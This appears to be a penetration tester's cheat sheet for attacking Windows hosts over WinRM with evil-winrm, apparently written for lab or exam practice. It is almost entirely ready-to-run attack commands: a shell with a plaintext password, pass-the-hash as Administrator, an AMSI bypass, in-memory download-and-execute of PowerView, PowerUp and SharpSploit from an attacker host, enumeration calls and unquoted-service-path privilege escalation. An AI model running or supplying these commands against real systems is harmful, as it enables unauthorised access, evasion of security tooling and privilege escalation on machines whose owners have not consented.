**WinRM (Windows Remote Management) used against WinRM services (Microsoft implementation of WS-Management Protocol), usually port 5985.**
```bash - kali
sudo gem install winrm winrm-fs colorize stringio
```

```bash - kali
cd /opt && sudo git clone https://github.com/Hackplayers/evil-winrm.git
```

#### Shell with WinRM
```bash - kali
ruby /opt/evil-winrm/evil-winrm.rb -i $TARGET -u jamie -p 'rangers'
```
#### Passing the hash
```bash - kali
ruby /opt/evil-winrm/evil-winrm.rb -i $TARGET -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
```

| SAMPLE DC RESULTS | FROM SCANS |
| --- | --- |
| NETBIOS_DOMAIN_NAME  | PENTESTING |
| NETBIOS_COMPUTER_NAME  | DC |
| DNS_DOMAIN_NAME  | pentesting.local |
| DNS_COMPUTER_NAME  | dc.pentesting.local |
| SAMPLE AD RESULTS | FROM SCANS |
| --- | --- |
| NETBIOS_DOMAIN_NAME  | PENTESTING |
| NETBIOS_COMPUTER_NAME  | AD |
| DNS_DOMAIN_NAME  | pentesting.local |
| DNS_COMPUTER_NAME  | ad.pentesting.local |
#### 24 EvilWinRM
![[Port 5985 - WinRM ~#Steps]]

#### 25 EvilWinRM + Local Priv Esc Upload and Download
![[Port 5985 - WinRM ~#Downloading files - MUST USE FULL PATHS]]
![[Port 5985 - WinRM ~#Uploading files - MUST USE FULL PATHS]]

#### 26 EvilWinRM + Local Priv Esc PowerView ps1
Download the following:
```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1
```

```
menu
```

```
Bypass-4MSI
```

[[Python#Server]]
```
IEX(New-Object Net.WebClient).DownloadString('http://$KALI/PowerView.ps1')
```

```
IEX(New-Object Net.WebClient).DownloadString('http://$KALI/PowerUp.ps1')
```

```
Invoke-AllChecks
```

#### EvilWinRM + Local Privilege Escalation SharpSploit Enumeration

https://github.com/cobbr/SharpSploit

GUIDE: https://blog.king-sabri.net/red-team/how-to-compile-embed-and-use-sharpsploit

[[Python#Server]]

```
Bypass-4MSI
```

```
Dll-Loader -http -path http://$KALI/SharpSploit.dll
```

```
menu
```

```
[SharpSploit.
```

Hit tab a few times to see all possibilities!
```
[SharpSploit.Enumeration.Net]::GetNetLocalGroupMembers()
```

```
[SharpSploit.Enumeration.Net]::GetNetLocalGroups()
```

```
[SharpSploit.Enumeration.Net]::GetNetLoggedOnUsers()
```

```
[SharpSploit.Enumeration.Net]::GetNetSessions()
```

```
[SharpSploit.Enumeration.Net]::GetNetShares()
```

#### 33 EvilWinRM + Local Priv Esc SEImpersonate
[[7._Potato or PrintSpoofer#PrintSpoofer]]

#### 34 EvilWinRM + Local Priv Esc Unquoted Service Path

[[16._Unquoted Path]]

Depending on which folder we have read / write access to:
C:\Program.exe
C:\Program Files\Abyss.exe
C:\Program Files\Abyss Web\ Abyss Web Server\abyssws.exe
